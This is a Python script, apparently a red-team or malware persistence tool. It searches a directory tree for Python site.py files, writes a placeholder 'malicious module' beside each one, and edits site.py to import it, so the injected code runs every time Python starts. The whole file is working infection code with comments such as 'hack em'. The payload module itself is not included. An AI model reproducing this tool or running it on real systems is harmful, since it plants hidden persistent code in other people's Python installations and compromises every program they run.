"""
Inject a module into the python site package, so it will execute every time that python is executed
@author: degenerat3
"""


import os
import re
import site
import sys
import zipfile


MODULE_CODE = "changeme.py"           # The malicious module source code file
DEST_MODULE_NAME = "changeme.py"       # The name of the module that will get dropped into sitepkg


def read_module_code(filename):
    """
    Read the source code for the malicious module into a string
    @param filename: the file holding the src code
    @return: a string containing the code
    """
    if sys.argv[0].endswith(".zip"):
        with zipfile.ZipFile(sys.argv[0]) as z:
            result = z.read(filename)
    else:
        with open(filename) as f:
            result = f.read()
    return result


def drop_module(dest_file_path):
    """
    Write the malicious module to the given path (likely /usr/lib/pythonX)
    @param dest_file_path: The destination of the malicious module
    @return: none
    """
    global MODULE_CODE
    mod_code = read_module_code(MODULE_CODE)
    with open(dest_file_path, "w") as f:
        f.write(mod_code)
    return


def find_site(search_pth):
    """
    Iterate through the given path and find all python files
    @param pth: the starting directory to search
    @return: an array of URIs of python files to infect
    """
    global DEST_MODULE_NAME
    py_files = []
    for subdir, dirs, files in os.walk(search_pth):        # iterate through everything
        for fil in files:
            fname = os.path.join(subdir, fil)
            if "site.py" in fname and "site.pyc" not in fname:                      # if it's the site module
                py_files.append(fname)
                finame = fname.split("/")[:-1]         # split down to just the directory
                finame = "/".join(finame) + "/" + DEST_MODULE_NAME
                drop_module(finame)                     # write the module to the dir

    return py_files


def infect_file(file_path):
    """
    Import the malicious module and add the malicious function to the given file
    @param file_path: the URI of the file to infect
    @return: none
    """
    global DEST_MODULE_NAME
    old_content = ""
    with open(file_path, "r") as f:
        old_content = f.read()      # read the contents of the file into a string
    
    search_str = "import " + DEST_MODULE_NAME[:-3]
    if search_str in old_content:
        return      # return if it's already infected

    res = re.search('^import sys', old_content, flags=re.MULTILINE)   # find the first import line
    if res:    
        # make a new import block that has our module
        new_imp = "import sys\nimport " + DEST_MODULE_NAME[:-3] + "\n"     
        new_con = old_content.replace("import sys", new_imp, 1)     # insert the new import block
        with open(file_path, "w") as f:
            print("Infecting " + file_path + "...")
            f.write(new_con)    # write the new content

    else:       # if there's no import block, just skip it, too much hassle
        return


def infect(search_dir):
    """
    The work horse function of the script; drops module and infects files
    @param search_dir: The directory to start the recursive search in
    @return: none
    """
    # mod_dest = get_pkg_dir() + "/" + DEST_MODULE_NAME   # establish location for malicious module
    # drop_module(mod_dest)   # write the module  DO THIS ELSEWHERE
    py_files = find_site(search_dir)  # find python
    for f in py_files:
        infect_file(f)      # hack em
    return


def main():
    """
    Take argument from cmdline (if present), pass into "infect'
    """
    argc = len(sys.argv)
    if argc > 1:    # if user defined a directory, use it
        infection_dir = sys.argv[1]
    else:           # otherwise just use cwd
        infection_dir = os.getcwd()
    print("INFECTION DIR: " + infection_dir)
    infect(infection_dir)


main()